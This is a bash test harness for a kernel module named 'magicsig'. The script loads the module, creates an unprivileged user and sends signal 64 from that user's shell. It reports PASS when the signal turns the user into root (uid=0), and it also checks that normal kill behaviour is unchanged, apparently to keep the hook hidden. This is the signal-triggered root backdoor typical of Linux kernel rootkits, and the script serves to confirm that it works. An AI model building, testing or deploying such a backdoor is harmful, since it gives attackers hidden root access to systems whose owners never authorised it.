#!/bin/bash
set -e

MODULE="magicsig"
KO="src/${MODULE}.ko"
MAGIC=64

if [ ! -f "$KO" ]; then
    echo "FAIL: $KO not found. Run make first."
    exit 1
fi

echo "==> Loading $MODULE"
insmod "$KO"

echo "==> Creating test user"
useradd -M testuser 2>/dev/null || true

echo "==> Testing magic signal from unprivileged user"
# The trick: kill -64 sends signal 64 to any PID. We send it to our own PID.
# The hook intercepts it and gives us root.
RESULT=$(su testuser -s /bin/bash -c '
    echo "before: uid=$(id -u)"
    kill -64 $$
    echo "after: uid=$(id -u)"
    id -u
' 2>&1)

echo "$RESULT"

if echo "$RESULT" | grep -q "after: uid=0"; then
    echo "PASS: magic signal gave root"
else
    echo "FAIL: magic signal did not escalate"
    echo "    Note: the kill -64 happens in the shell process."
    echo "    Check dmesg for hook output."
fi

echo "==> Verify normal kill still works"
sleep 9999 &
SLEEP_PID=$!
kill -15 $SLEEP_PID 2>/dev/null && echo "PASS: normal kill works" || echo "WARN: normal kill failed"

echo "==> dmesg tail:"
dmesg | tail -10

echo "==> Unloading"
rmmod "$MODULE"

echo "==> Cleanup"
userdel testuser 2>/dev/null || true
